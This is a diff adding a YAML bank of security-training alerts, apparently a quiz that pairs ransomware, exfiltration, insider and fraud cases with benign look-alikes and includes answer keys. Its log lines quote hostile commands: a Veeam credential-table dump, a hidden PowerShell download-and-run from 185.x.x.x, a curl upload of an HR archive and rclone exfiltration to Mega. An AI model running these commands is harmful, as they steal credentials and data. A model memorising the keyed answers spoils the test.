@@ -1,0 +1,283 @@
+# ON SHIFT alerts, drop 3, part 5: ransomware kill-chain steps, staging/exfil, insider, physical and business edge cases (y181-y200)
+- id: y181
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Read of the backup configuration database'
+  h: 'BKP-VBR01 · corp\svc-veeam'
+  l: ['process: sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q "SELECT user_name,password FROM [VeeamBackup].[dbo].[Credentials]" as corp\svc-veeam, signed Microsoft binary', 'parent chain: services.exe → PSEXESVC.exe → cmd.exe → sqlcmd.exe (PsExec with explicit credentials); Veeam.Backup.Service.exe is not involved', 'the 38 returned rows were piped into a PowerShell block calling ProtectedData.Unprotect and written as plaintext to C:\ProgramData\c.txt', 'the PsExec session came from FIN-WS14, a finance workstation that has never touched this backup server before']
+  v: 1
+  x: T1555
+  c: veeam-cred-store
+  k: [1, 3]
+  diff: 3
+  trap: bland
+  say: 'The Veeam configuration database credentials table was read through sqlcmd under the Veeam service account, launched over PsExec from a finance workstation.'
+  tell: 'Backup servers hold the keys to everything: domain admin, hypervisor root and repository credentials in one table, which is why ransomware crews raid them before encrypting. This is the shape of the Veeam credential grabs seen with CVE 2023-27532 and the public Veeam-Get-Creds scripts: signed sqlcmd, the right service account, nothing scary on its face. The deciding facts are the PsExec parent chain from a finance workstation and the decrypted plaintext file.'
+  q: {kind: contain, ask: 'First containment step?', o: ['Rotate every credential stored in the Veeam database and isolate FIN-WS14 and the backup server', 'Reset only the svc-veeam password', 'Restart the Veeam services to clear the session'], a: 0, why: 'The table holds many privileged credentials, so assume all were read and cut the source of the remote session.'}
+- id: y182
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Read of the backup configuration database'
+  h: 'BKP-VBR02 · NT SERVICE\VeeamBackupSvc'
+  l: ['process: Veeam.Backup.Service.exe (signed, Veeam Software Group GmbH) opened the VeeamBackup database and read dbo.Credentials 3 s into the 03:00 "Configuration Backup" job', 'parent chain: services.exe → Veeam.Backup.Service.exe; no shell, no sqlcmd, no interactive or remote logon on the server since 17:40', 'output: D:\VeeamConfigBackup\BKP-VBR02_nightly.bco, encrypted with the configuration-backup password, 41 MB, same name pattern every night for 3 years', 'no plaintext copy of the credentials was written anywhere; the file was then copied to the immutable repository by the repository sync job']
+  v: 0
+  x: T1555
+  c: veeam-cred-store
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'The Veeam backup service read its credentials table three seconds into the nightly configuration backup and wrote an encrypted configuration file.'
+  tell: 'Same table, same host role, opposite story. The reader is the Veeam service itself, launched by services.exe with no shell, no sqlcmd and no logon, and the only output is the encrypted configuration file it has written nightly for three years. Credential-store reads are judged by who reads and what comes out.'
+- id: y183
+  d: linux
+  src: 'ESXi · shell.log + hostd'
+  t: 'ESXi host: VM stop and disk rewrite'
+  h: 'ESX-PRD04 · root'
+  l: ['shell.log: lockdown mode disabled 02:08 and SSH started 02:09 with the local root account, not through vCenter; root login at 02:11 from 10.20.4.9', 'commands: esxcli vm process list, then a loop of esxcli vm process kill --type=force --world-id across all 31 running VMs within 90 seconds', 'file activity: /tmp/enc (ELF, unsigned, mode 0755) opened 112 .vmdk, .vmx and .vmsd files for write and appended a new extension; a README dropped in each VM directory', '10.20.4.9 is a domain-joined jump server first seen on the management VLAN today; root logins to this host normally come from the vCenter appliance']
+  v: 1
+  x: T1486
+  c: esxi-vm-process-kill
+  k: [1, 2]
+  diff: 3
+  say: 'Root force-killed all 31 VMs on an ESXi host in 90 seconds, then an unsigned file in tmp started writing the VM disk files.'
+  tell: 'This is the shape of the ESXi lockers Akira and Black Basta ship: list the world IDs, force-kill the VMs so the vmdk locks release, then encrypt the files in place. Thirty-one VMs die in 90 seconds and an unsigned ELF in /tmp starts writing right after. Nobody evacuates a host like this.'
+  q: {kind: contain, ask: 'Best first move?', o: ['Cut the management path from 10.20.4.9 and hunt the same ELF and SSH enablement on every other host', 'Restart the 31 VMs from the console to restore service', 'Wait for the writes to finish and restore from last night'], a: 0, why: 'Stop the spread to other hosts first; restarting VMs on a host with live writes only feeds the encryptor.'}
+- id: y184
+  d: linux
+  src: 'ESXi · shell.log + hostd'
+  t: 'ESXi host: VM stop and disk rewrite'
+  h: 'ESX-PRD07 · root'
+  l: ['shell.log: SSH enabled 21:52 through the vCenter host settings; root login at 21:55 from 10.20.4.12, the PAM bastion with session recording', 'host entered maintenance mode at 21:40 for a firmware update; 30 of 31 VMs were migrated by DRS, app-sql03 is stuck in a failing power-off task', 'commands: esxcli vm process list, then esxcli vm process kill --type=soft, and --type=hard two minutes later, for that single world ID', 'no new executables and no datastore writes beyond that VM''s vmware.log; SSH stopped and lockdown mode re-enabled by vCenter at 22:10']
+  v: 0
+  x: T1059.012
+  c: esxi-vm-process-kill
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'Root on an ESXi host stopped one VM with a soft kill, then a hard kill two minutes later, arriving through a PAM bastion.'
+  tell: 'Same esxcli command as the locker playbook, but scoped to one stuck VM on a host already in maintenance mode: soft first, hard two minutes later, the escalation path the vendor documents. The other 30 VMs were migrated, the session came through the PAM bastion, and the host went back to lockdown. Count the VMs before you panic.'
+- id: y185
+  d: linux
+  src: 'ESXi · hostd + vCenter tasks'
+  t: 'ESXi host: VM stop and disk rewrite'
+  h: 'ESX-PRD05 · vpxuser'
+  l: ['vCenter task: Reconfigure virtual machine · apply storage policy "VM Encryption" to 28 VMs on ds-prd02, initiated by svc-vmpolicy@vsphere.local from vcsa01 through the API', 'hostd: each VM reconfigured through vpxuser, disks rewritten in place with keys fetched from the corporate KMIP key provider kms01.corp.com, key provider status healthy', 'datastore ds-prd02: write throughput 6x baseline for 3 h and high host CPU; file names and extensions unchanged, no new executables, no shell session on the host', 'the policy change came from the infrastructure repo pipeline; every VM had a completed backup before the first task started']
+  v: 0
+  x: T1486
+  c: esxi-vm-process-kill
+  k: [0, 1]
+  diff: 3
+  trap: scary
+  say: 'vCenter applied an encryption storage policy to 28 VMs through the API, and the host disk write rate jumped sixfold for three hours.'
+  tell: 'Mass in-place rewriting of vmdk files with a sixfold write spike is also what a locker does, but this one is initiated by vCenter through the API, uses keys from the corporate key provider, leaves names and extensions alone and has no shell session. The encryptor you should fear needs a root shell; the encryption you ordered arrives as a vCenter task.'
+- id: y186
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Cloud sync utility transfers files to external storage'
+  h: 'FS-FIN02 · corp\svc-sched'
+  l: ['process: C:\Windows\Temp\winupd.exe copy \\fs-fin02\Finance$ mega:in -q --transfers 16 --ignore-existing, parent cmd.exe under a PsExec service', 'PE metadata: original filename rclone.exe, no publisher signature; file first seen on this host 20 minutes ago', 'config: C:\Windows\Temp\r.conf created at the same time with a [mega] remote, user an unfamiliar free-mail address, password obscured', 'network: 41 GB sent to g.api.mega.co.nz in 52 minutes; this host normally sends under 200 MB a day']
+  v: 1
+  x: T1567.002
+  c: rclone-remote-config
+  k: [1, 3]
+  diff: 2
+  say: 'A renamed executable in Temp copied the finance share to a remote at mega, sending 41 gigabytes in 52 minutes from a file server.'
+  tell: 'Renamed to winupd.exe, but the original filename still says rclone and the config points at a free-tier cloud drive. Akira and plenty of other crews use rclone to Mega for the same reason: it is fast, signed by nobody and looks like a sync. 41 GB from a file server that sends 200 MB a day is the real alert.'
+  q: {kind: pivot, ask: 'First pivot?', o: ['Find the PsExec source and who ran it, and hunt the same file on other servers', 'Block mega.nz at the proxy and close the alert', 'Ask the finance lead whether they use cloud storage'], a: 0, why: 'Blocking one domain leaves the intruder and the next exfil path in place; find the session and the other hosts.'}
+- id: y187
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Cloud sync utility transfers files to external storage'
+  h: 'BKP-FS03 · corp\svc-rclone'
+  l: ['process: D:\Tools\rclone\rclone.exe sync D:\Shares b2:corp-fs-offsite --fast-list --transfers 8 --log-file D:\Logs\rclone.log, parent Task Scheduler task "Offsite-FS-Sync"', 'binary: unmodified rclone.exe at its install path, hash matches the version pinned in the software catalogue; the task was created 14 months ago', 'config: remote b2 uses an application key restricted to bucket corp-fs-offsite with write and list only, no delete; the bucket belongs to the corporate Backblaze account', 'network: about 38 GB to Backblaze endpoints between 01:00 and 02:10 each night, the same band for 14 months']
+  v: 0
+  x: T1567.002
+  c: rclone-remote-config
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A scheduled task ran rclone from its install folder and synced file shares to a Backblaze bucket, about 38 gigabytes in seventy minutes.'
+  tell: 'Same tool, same upload to a cloud service, opposite story. The binary is the pinned build in its own folder, the schedule is 14 months old, the destination is a corp-owned bucket with a key that cannot delete, and the bytes repeat every night. Judge rclone by who owns the remote.'
+- id: y188
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Archive utility run over a file share'
+  h: 'FS-HR01 · corp\adm-jlopez'
+  l: ['process: C:\Users\Public\7z.exe a -t7z -mx1 -mhe=on -p[masked] D:\PerfLogs\hr.7z \\fs-hr01\HR$\*, parent cmd.exe under a service named PerfSvc2', 'binary: 7z.exe sits in a user-writable folder, 7-Zip is not installed on this server, file written 8 minutes ago', 'output: a single 6.8 GB archive with encrypted headers after 14 min of reads across personnel, payroll and legal-hold folders; this account administers 3 servers and never reads HR content', '11 minutes later: curl.exe -T D:\PerfLogs\hr.7z https://185.x.x.x/u from the same session, then del /f on the archive']
+  v: 1
+  x: T1560.001
+  c: archive-staging
+  k: [1, 3]
+  diff: 3
+  say: 'A 7-Zip copy in the Public folder built a 6.8 GB encrypted archive of the HR share, and curl uploaded it to an external address.'
+  tell: 'Single archive, encrypted headers, built in PerfLogs with a copy of 7-Zip dropped eight minutes ago: classic staging, and the curl upload plus delete closes the chain. A 7z run by an admin on a file server is otherwise the dullest event in the bank. The dropped binary, the HR scope and the upload make it theft.'
+  q: {kind: pivot, ask: 'What do you scope next?', o: ['Everything else this account touched and every host that reached 185.x.x.x', 'Only the ACLs on the HR share', 'Whether 7-Zip is on the software list'], a: 0, why: 'The archive already left; the question is how far the account and the destination reach.'}
+- id: y189
+  d: endpoint
+  src: 'EDR · Process creation'
+  t: 'Archive utility run over a file share'
+  h: 'FS-HR02 · corp\svc-archive'
+  l: ['process: C:\Program Files\7-Zip\7z.exe a -t7z -mx5 -mhe=on -p[masked] E:\Archive\HR\closed-cases.7z \\fs-hr02\HR$\Closed\*, parent Task Scheduler task "HR-Quarterly-Archive"', 'binary: the packaged 7-Zip install under Program Files, deployed by the software client; the task was created 3 years ago and runs on the first of each quarter', 'scope: closed-case folders only (read-only ACL set by the records system at case close); 6.1 GB archive written to E:\Archive on the same server, then source files tiered to cold storage', 'network: no outbound connection from the process or its children; svc-archive password in the vault; the archive share is readable by Legal and Records only']
+  v: 0
+  x: T1560.001
+  c: archive-staging
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'The scheduled quarterly task ran the installed 7-Zip over closed-case HR folders and wrote a 6.1 GB encrypted archive on the same server.'
+  tell: 'A password-protected 7z over an HR share looks like staging until you read the context. The installed binary, the quarterly schedule, closed-case scope and a destination on the same server with no egress are what records retention looks like. Compare a dropped binary, live HR folders and a curl upload.'
+- id: y190
+  d: cloud
+  src: 'M365 · Unified Audit Log + DLP'
+  t: 'Bulk file access tied to a leaver'
+  h: 'LT-SLS31 · corp\a.fischer'
+  l: ['HR feed: resignation accepted 6 days ago, last day in 9 days; access not yet reduced', 'activity: 11,400 files from the Sales-Pipeline and Pricing SharePoint sites synced to the laptop in 40 min; the user joined Pricing 3 weeks ago and the 12-month baseline for this role is about 40 files a week', 'endpoint DLP: dropbox.exe sync client installed 2 days ago uploaded 3.9 GB from C:\Users\a.fischer\SalesOps\ to a personal Dropbox account (a.fischer.sales@gmail.com), not the corporate team', 'DLP classification: 62% of the files carry the label Confidential - Customer Pricing; 4 uploads to personal webmail were blocked earlier the same day']
+  v: 1
+  x: T1567.002
+  c: departing-user-data
+  k: [0, 2]
+  diff: 3
+  say: 'A user whose resignation was accepted six days ago synced eleven thousand sales files, then uploaded 3.9 GB to a personal Dropbox account.'
+  tell: 'The notice date explains the motive, the baseline explains the surprise and the personal Dropbox client explains the destination. Departing-employee theft is a boring insider story: the client list leaves with the person, and the labels show it was confidential pricing. Decide before the last day, not after.'
+  q: {kind: contain, ask: 'Best next step?', o: ['Block the sync client, preserve evidence and loop in HR and counsel before talking to the user', 'Email the user and ask them to delete the files', 'Wait for the last day and review the logs then'], a: 0, why: 'Stop the flow quietly, keep the evidence intact and let HR and counsel run the conversation.'}
+- id: y191
+  d: cloud
+  src: 'M365 · Unified Audit Log + DLP'
+  t: 'Bulk file access tied to a leaver'
+  h: 'LT-SLS28 · corp\p.nowak'
+  l: ['HR feed: resignation accepted 5 days ago, last day in 10 days; the offboarding checklist is open with the manager', 'activity: 9,800 files copied over 3 days from the user''s own OneDrive and the Sales-Pipeline site into the folder Handover on the Sales-Ops team site, using the browser; the user created 96% of the files', 'destination: corporate tenant only; no external sharing links, no sync client on an unmanaged device, 0 DLP blocks; the manager was granted access to Handover by the offboarding workflow', 'volume: about 3,000 files a day against a 300 a day baseline, matching the checklist task "handover of working files"']
+  v: 0
+  x: T1567.002
+  c: departing-user-data
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A user with ten days left copied 9,800 files from their own OneDrive and a team site into a handover folder inside the tenant.'
+  tell: 'The leaver flag makes it look like a smash and grab, but the files are the user''s own work, copied inside the tenant to a team folder the manager can open. No external link, no personal sync, no DLP blocks. Handovers are noisy; theft leaves the tenant.'
+- id: y192
+  d: cloud
+  src: 'M365 · Unified Audit Log + DLP'
+  t: 'Bulk file access tied to a leaver'
+  h: 'WS-SLS09 · corp\m.kowalski'
+  l: ['actor: m.kowalski@corp.com (Sales Ops manager) opened the retained OneDrive of t.brandt, who left 12 days ago; access was granted to the manager by the account-deletion workflow', 'activity: 14,200 files moved inside the tenant to the Sales-Ops team site over 2 h using the OneDrive "Move to" action', 'source: managed laptop in the office, compliant, BitLocker on; no download to local disk, no sync client, no external sharing links created', 'the deleted-user retention window is 30 days and 18 days remain']
+  v: 0
+  x: T1567.002
+  c: departing-user-data
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'A manager moved 14,200 files out of a former colleague''s retained OneDrive into the team site over two hours from a compliant laptop.'
+  tell: 'Fourteen thousand files touched in two hours sounds like a smash and grab, except the owner already left and the deletion workflow handed the manager the retained account on purpose. The files moved inside the tenant from a compliant office laptop with no sync client or external link. The leaver is not the actor here.'
+- id: y193
+  d: endpoint
+  src: 'EDR · Device control + input telemetry'
+  t: 'New USB device typing into the foreground window'
+  h: 'LT-ACC22 · corp\p.okafor'
+  l: ['device: new USB composite device at 14:02 exposing mass storage (volume label "GIFT") and a keyboard interface; vendor and product ID not in the approved device list', 'input: 212 keystrokes in 1.6 s starting with Win+R, then a command line and Enter, while the user was idle for 11 min with the screen unlocked', 'process: powershell.exe -w hidden -nop -c "iex (iwr http://185.x.x.x/a)", parent explorer.exe, 2 s after the device appeared', 'mailroom note: a parcel with a USB drive and a gift card arrived for this user last week from a sender with no matching order']
+  v: 1
+  x: T1200
+  c: hid-injection-vs-token
+  k: [0, 1]
+  diff: 3
+  say: 'A new USB device that also presented as a keyboard typed 212 keystrokes in under two seconds, opening a dialog and a hidden PowerShell.'
+  tell: 'A drive that also declares itself a keyboard, 212 keystrokes in under two seconds, Win+R and a hidden PowerShell while the user is away. This is the shape of the FIN7 mailed-USB campaign and every rubber-ducky demo. Blocking USB mass storage would not have stopped it, because the device is a keyboard.'
+  q: {kind: contain, ask: 'First action?', o: ['Isolate the laptop, pull the device for forensics and sweep for the same vendor ID and the 185 address', 'Eject the drive and ask the user to scan it', 'Block USB mass storage tenant-wide and close the alert'], a: 0, why: 'The payload already ran; contain the host, keep the hardware and hunt for siblings.'}
+- id: y194
+  d: endpoint
+  src: 'EDR · Device control + input telemetry'
+  t: 'New USB device typing into the foreground window'
+  h: 'LT-ACC31 · corp\r.dube'
+  l: ['device: YubiKey 5 NFC (vendor Yubico), serial in the token inventory and issued to this user 3 weeks ago; keyboard interface only, no mass storage', 'input: 44 characters in 0.2 s, a modhex string starting with "cccccc", then Enter, into a focused password-manager login field in Edge', 'process: no new processes, no Win+R, no shell window; the foreground app is unchanged before and after', 'result: the password-manager sign-in succeeded 1 s later with the YubiKey OTP method']
+  v: 0
+  x: T1200
+  c: hid-injection-vs-token
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A YubiKey typed a forty-four character string in two tenths of a second into a password manager login field, then pressed Enter.'
+  tell: 'Also a keyboard that types dozens of characters in a fraction of a second, but it is a token: serial in the inventory, one field, no Win+R, no shell and a successful sign-in a second later. Judge input bursts by where they land.'
+- id: y195
+  d: network
+  src: 'NAC · DHCP + flow logs'
+  t: 'Unknown device sweeping internal subnets'
+  h: 'SW-3F-Gi1/0/12 · 10.40.3.77'
+  l: ['NAC: new MAC with an OUI registered to Raspberry Pi Trading on switch port Gi1/0/12 (conference room 3F wall plate), authenticated by MAC bypass after 802.1X timed out; DHCP hostname "HP-LaserJet-3F"', 'flows: slow SYN sweep of three /24s on 22, 445, 3389 and 5985 at about 2 packets per second for 40 minutes', 'egress: persistent TLS to 185.x.x.x:443 with no SNI and a 90-second keepalive, from the user VLAN', 'asset inventory: no record for this MAC; the floor''s only printer is on port Gi1/0/31 with a different MAC']
+  v: 1
+  x: T1200
+  c: network-implant-vs-scanner
+  k: [0, 3]
+  diff: 3
+  say: 'A new Raspberry Pi device on a conference room port, named like a printer, slowly sweeps three subnets and holds a quiet 443 connection out.'
+  tell: 'A Pi wearing a printer hostname in a conference-room wall jack is every red-team report and a few real intrusions. Low-and-slow sweep, silent tunnel out over 443, no inventory record, and the real printer is down the hall on a different MAC. Pull the port first and ask facilities later.'
+  q: {kind: contain, ask: 'Best first action?', o: ['Disable the switch port and preserve the device and port logs for forensics', 'Add the MAC to the NAC allowlist and keep monitoring', 'Send facilities a survey about the new printer'], a: 0, why: 'A rogue wired device is a live foothold; take the port down and keep the hardware.'}
+- id: y196
+  d: network
+  src: 'NAC · DHCP + flow logs'
+  t: 'Unknown device sweeping internal subnets'
+  h: 'SW-DC1-Gi1/0/8 · 10.40.9.15'
+  l: ['NAC: new virtual NIC MAC (hypervisor OUI) on the vulnerability-management VLAN; DHCP hostname "scan02"; first lease today, VM cloned from the corporate scanner template', 'flows: full-range sweep of 10.40.0.0/16 and 10.50.0.0/16 on all ports at about 4,000 packets per second, then authenticated checks over 445, 22 and 5985 against roughly 900 hosts with the svc-scan managed service account', 'egress: TLS to the scanner vendor''s cloud console on 443 with its published SNI and a certificate issued to the vendor, 60-second heartbeat', 'asset inventory: registered 3 days ago by the vulnerability-management lead with owner and scan window Tue 01:00-05:00; the source IP is in the IDS and EDR scan exclusions']
+  v: 0
+  x: T1200
+  c: network-implant-vs-scanner
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'A cloned VM sweeps two /16 ranges at four thousand packets a second, then logs into about nine hundred hosts with a service account.'
+  tell: 'Louder than the implant by two orders of magnitude and still the safer one: a full-range sweep from a cloned scanner VM with a vendor-bound heartbeat, a managed service account and a registered scan window. Loud, inventoried and vendor-bound is a scanner. Quiet, uninventoried and tunnelling out is not.'
+- id: y197
+  d: cloud
+  src: 'HRIS · Audit log'
+  t: 'Direct-deposit details changed'
+  h: 'hris-prod · s.mehta@corp.com'
+  l: ['operation: Change bank account by employee self-service · s.mehta@corp.com (VP Finance Planning) · new account at a neobank (ending 4417), previous account at the long-standing payroll bank', 'session: sign-in from 45.x.x.x (residential proxy ASN) on a new device; password reset by email link 12 min earlier, new authenticator registered 9 min earlier', 'mailbox: inbox rule created 2 h earlier moving messages matching "direct deposit", "payroll" and "bank" to the RSS Subscriptions folder', 'payroll cutoff in 2 days; the HRIS sends its confirmation to the work email only']
+  v: 1
+  x: T1657
+  c: payroll-bank-change
+  k: [1, 2]
+  diff: 3
+  trap: bland
+  say: 'An employee self-service edit moved direct deposit to a neobank account after a password reset, a new authenticator and an inbox rule hiding payroll mail.'
+  tell: 'One employee, one bank field, a self-service edit: the dullest request in HR. The 12-minute-old password reset, the fresh authenticator and the inbox rule hiding payroll mail are the payroll-diversion kit BEC crews have run for years. What matters is whether the real employee would ever see the confirmation.'
+  q: {kind: contain, ask: 'Best containment?', o: ['Hold the payroll change, revoke sessions and authenticators, remove the rule and call the employee on a known number', 'Email the employee to ask whether they changed it', 'Let payroll run and claw the money back later'], a: 0, why: 'Confirmation emails go to the mailbox the intruder controls; verify out of band and stop the payment first.'}
+- id: y198
+  d: cloud
+  src: 'HRIS · Audit log'
+  t: 'Direct-deposit details changed'
+  h: 'hris-prod · svc-hris-int'
+  l: ['operation: Update bank account (batch) · 1,812 employee records in 4 min by svc-hris-int, the HRIS integration user, from the payroll provider connector', 'before and after compare: account values identical on 1,809 of 1,812 records, only the storage format changed from plain to tokenised; 3 records differ where employees had self-service edits pending', 'cause: payroll provider cutover project; connector credentials added 3 weeks ago by the HR operations lead with a second approver; the provider confirmed receipt of the tokenised values', 'each employee received the standard "your bank details were updated" email; no suppression rules, sign-in only from the connector''s published IP range']
+  v: 0
+  x: T1657
+  c: payroll-bank-change
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'An integration user rewrote bank account fields on 1,812 employee records in four minutes during a payroll provider cutover project.'
+  tell: 'A bulk rewrite of 1,812 bank fields smells like a payroll heist until you diff it: the values are the same, only the storage format moved, and the three that differ were employees'' own pending edits. Integration identity, a second approver, notifications left on. Judge bank-detail edits by whether the value changed and who is told.'
+- id: y199
+  d: cloud
+  src: 'Registrar · account audit log'
+  t: 'Nameserver change on primary domain'
+  h: 'domain: corp.com'
+  l: ['operation: Update nameservers for corp.com · ns1.dnshost-a.example and ns2.dnshost-a.example → ns1.dns-hub-9.example and ns2.dns-hub-9.example', 'actor: dns-owner@corp.com signed in from 185.x.x.x in a new country with a password only; two-factor was turned off 6 min earlier and the transfer lock was removed', 'zone at the new nameservers (queried 4 min later): mail and vpn hostnames resolve to 185.x.x.x hosting, TTL 300 on every record against 3600 before', 'CT log: new certificate for mail.corp.com issued 9 min after the change by a public CA that the old zone''s CAA record did not allow']
+  v: 1
+  x: T1584.001
+  c: registrar-ns-change
+  k: [1, 3]
+  diff: 3
+  say: 'Main domain nameservers changed from a new country after two-factor was disabled and the lock removed; a mail certificate followed nine minutes later.'
+  tell: 'Nameserver change plus lock removal plus two-factor switched off six minutes earlier, then a certificate for the mail host from a CA the old CAA record forbade: the shape of the sea-turtle-style registrar hijacks. Own the DNS and you can pass domain validation and sit in the middle with a valid certificate.'
+  q: {kind: contain, ask: 'Fastest containment?', o: ['Contact the registrar to lock and revert the nameservers, reset the account and revoke the new certificate', 'Wait for the TTL to expire so the records heal', 'Re-issue the corporate certificate and carry on'], a: 0, why: 'Revert at the registrar first; caches, certificates and credentials follow from there.'}
+- id: y200
+  d: cloud
+  src: 'Registrar · account audit log'
+  t: 'Nameserver change on primary domain'
+  h: 'domain: corp-eu.com'
+  l: ['operation: Update nameservers for corp-eu.com · old provider nameservers → ns1.cloudzone-b.example and ns2.cloudzone-b.example, with the DS record replaced in the same request for the new provider''s DNSSEC key', 'actor: dns-owner@corp.com on the corporate VPN from the same device and IP as the last 3 renewals, two-factor satisfied; registry lock released through the registrar''s out-of-band callback and re-locked 20 min later', 'zone parity: the old zone was exported and imported 6 days ago; an automated diff of 214 records shows 0 differences, TTLs were lowered to 300 s 48 h before the change', 'after the change: resolvers return identical mail and VPN addresses, no new certificates in the CT log; change made in the Saturday 02:00 window']
+  v: 0
+  x: T1584.001
+  c: registrar-ns-change
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A secondary domain moved to new nameservers with a DS update, registry lock released by callback, at two in the morning on Saturday.'
+  tell: 'A nameserver swap plus a DS update is the scariest-sounding change a DNS owner can make, and also what a provider migration looks like. The signal is parity: 214 records, 0 diffs, TTLs pre-lowered, the lock handled out of band and re-armed, no new certificates. A hijack changes the answers; a migration does not.'
